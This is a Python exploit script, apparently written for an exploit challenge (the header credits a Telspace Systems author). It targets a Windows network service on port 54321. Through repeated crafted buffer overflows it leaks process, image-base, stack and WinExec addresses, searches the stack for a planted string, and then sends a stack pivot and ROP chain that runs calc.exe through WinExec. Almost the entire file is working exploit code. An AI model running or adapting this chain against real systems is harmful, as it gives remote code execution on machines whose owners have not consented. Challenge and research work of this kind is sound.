import socket
import struct
import time

#Athanasios Tsepelis of Telspace Systems - https://www.telspace.co.za
#Code completed in a rush for the challenge, heads up!

HOST = '0.0.0.0'  
PORT = 54321      

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cookie = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8
command = "ABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGH"
command += "\x65\x65\x65\x65\x65\x65\x65\x65\x60\x00\x00\x00\x00\x00\x00\x00"
s.sendall(cookie + command)
data1 = s.recv(1024)
d = struct.unpack('<Q',data1)
proc_addr = d[0]
print "[+] Leaking Process Address: " + hex(d[0])
s.shutdown(socket.SHUT_RDWR)
s.close()

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cookie = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8
imgbase = proc_addr + 0x010
print "[+] Image Base Address Offset of Process: " + hex(imgbase)
img_final = struct.pack('<Q',imgbase)
command = "ABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGH"
command += "\x47\x65\x65\x65\x65\x65\x65\x65" + img_final
s.sendall(cookie + command)
data2 = s.recv(1024)
d = struct.unpack('<Q',data2)
image_leak = d[0]
print "[+] Image Base Address: " + hex(d[0])
s.shutdown(socket.SHUT_RDWR)
s.close()

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cookie = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8
command = "ABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGH"
command += "\x65\x65\x65\x65\x65\x65\x65\x65" + "\x10\x00\x00\x00\x00\x00\x00\x00"
s.sendall(cookie + command)
data3 = s.recv(1024)
d = struct.unpack('<Q',data3)
stack_leak = d[0]
print "[+] Stack Limit Base Address: " + hex(d[0])
s.shutdown(socket.SHUT_RDWR)
s.close()

test_test_leak = stack_leak
whole_leak_final = struct.pack('<Q', test_test_leak)
counter = 0
print "[+] Going Backwards the Stack Looking For the Goodies!"
print "[+} Be a Few Seconds Patient..."
while 1:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	cookie = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8
	command = "AAAAAAAAABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHBCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDEGHAB" + "calc.exe\x00" + "ACDFEGHABCDFEGH"
	command += "\x47\x65\x65\x65\x65\x65\x65\x65" + whole_leak_final
	s.sendall(cookie + command)
	data5 = s.recv(1024)
	d = struct.unpack('<Q',data5)
	whole_stack = d[0]
	counter = counter + 1
	if whole_stack == 7311705244946948451:
		offset = (counter-1) * 0x08
		print "[+] Goodies Found at Offset: " + hex(offset)
		break
	else:
		test_test_leak = test_test_leak+0x08
		whole_leak_final = struct.pack('<Q',test_test_leak)
	s.shutdown(socket.SHUT_RDWR)
	s.close()



s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cookie = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8
testtest = struct.unpack('<Q',data2)
winexec_leak = testtest[0] + 0x9010
winexec_leak_final = struct.pack('<Q', winexec_leak)
command = "ABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGHABCDFEGH"
command += "\x47\x65\x65\x65\x65\x65\x65\x65" + winexec_leak_final
s.sendall(cookie + command)
data4 = s.recv(1024)
d = struct.unpack('<Q',data4)
wel_leak = d[0]
print "[+] WinExec Address: " + hex(d[0])
s.shutdown(socket.SHUT_RDWR)
s.close()

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cookie = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8
stack_base_teb = struct.pack('<Q',stack_leak-0x8)
un_pivot = struct.unpack('<Q',data2)
spivot = un_pivot[0] + 0x158b
poprdx = un_pivot[0] + 0x4525
pop_rax = un_pivot[0] + 0x1167
pop_rcx = un_pivot[0] + 0x89ab
add_esp = un_pivot[0] + 0x1164
ret = un_pivot[0] + 0x158f
ladder = stack_leak + offset
jmptomain = un_pivot[0] + 0x11d5
packed_ladder = struct.pack('<Q',ladder)
print "[+] Executing Pivot Stack from gadget: " + hex(spivot)
print "[+] Executing ROP Chain!"
spivot_final = struct.pack('<Q',spivot)
poprdx_final = struct.pack('<Q',poprdx)
pop_rax_final = struct.pack('<Q',pop_rax)
pop_rcx_final = struct.pack('<Q',pop_rcx)
winexec_final = struct.pack('<Q',wel_leak)
jmptomain_final = struct.pack('<Q',jmptomain)
ret_final = struct.pack('<Q',ret)
add_esp_final = struct.pack('<Q',add_esp)
command = "AAAAAAAAAAa3Aa4A" + pop_rax_final + stack_base_teb + poprdx_final + "\x01\x00\x00\x00\x00\x00\x00\x00" + pop_rax_final + stack_base_teb + pop_rcx_final + packed_ladder + "AAc7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af" + ret_final + winexec_final + spivot_final + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAg9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj" + spivot_final + "k1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8A9Ao0AB" + jmptomain_final + "ABCDEFGH6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6A" + add_esp_final + "ABCDEFGHcalc.exe\x00" +"5Aq6Aq7Aq8Aq9Ar"
command += "\x51\x65\x65\x65\x65\x65\x65\x65" + spivot_final
s.sendall(cookie + command)
data3 = s.recv(1024)
s.shutdown(socket.SHUT_RDWR)
s.close()
